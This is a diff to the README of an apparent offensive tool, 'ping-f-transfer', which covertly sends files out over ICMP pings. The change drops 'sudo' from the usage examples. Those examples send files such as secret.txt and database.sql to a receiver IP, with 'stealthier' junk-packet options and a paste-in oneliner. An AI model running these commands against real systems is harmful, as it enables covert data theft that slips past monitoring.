@@ -93,7 +93,7 @@ Replace `ping-f-transfer` with `python3 ping-f-transfer.py` in all examples belo
 
 ```bash
 # Direct transfer using ping
-sudo ping-f-transfer transfer -f secret.txt -i 10.10.14.5
+ping-f-transfer transfer -f secret.txt -i 10.10.14.5
 
 # Or generate a oneliner to paste on the sender machine
 ping-f-transfer generate -f secret.txt -i 10.10.14.5 -l python
@@ -141,18 +141,18 @@ The tool splits the file into 12-byte chunks, prepends a 3-byte big-endian index
 
 ### `transfer`
 
-Directly send a file from the current machine using `ping`. Requires root/sudo (ICMP needs raw sockets).
+Directly send a file from the current machine using `ping`.
 
 ```bash
-sudo ping-f-transfer transfer -f <file> -i <receiver-ip>
+ping-f-transfer transfer -f <file> -i <receiver-ip>
 ```
 
 ```bash
 # Send with a 0.5s gap between pings
-sudo ping-f-transfer transfer -f data.db -i 10.10.14.5 -p 0.5
+ping-f-transfer transfer -f data.db -i 10.10.14.5 -p 0.5
 
 # Send with encryption and compression
-sudo ping-f-transfer transfer -f data.db -i 10.10.14.5 --compress --encrypt --enc-passphrase 'MyS3cretP@ss'
+ping-f-transfer transfer -f data.db -i 10.10.14.5 --compress --encrypt --enc-passphrase 'MyS3cretP@ss'
 
 # Estimate transfer time without sending
 ping-f-transfer transfer -f data.db -i 10.10.14.5 -p 0.3 --estimate-transfer-time
@@ -354,10 +354,10 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 
 ```bash
 # Fast transfer (no delay between pings)
-sudo ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5
+ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5
 
 # Slower, stealthier transfer with junk packets
-sudo ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5 -p 1.0 -r 0.3 --junk 5 --randomize-junk
+ping-f-transfer transfer -f /tmp/database.sql -i 10.10.14.5 -p 1.0 -r 0.3 --junk 5 --randomize-junk
 ```
 
 ### Generate a stealthy oneliner
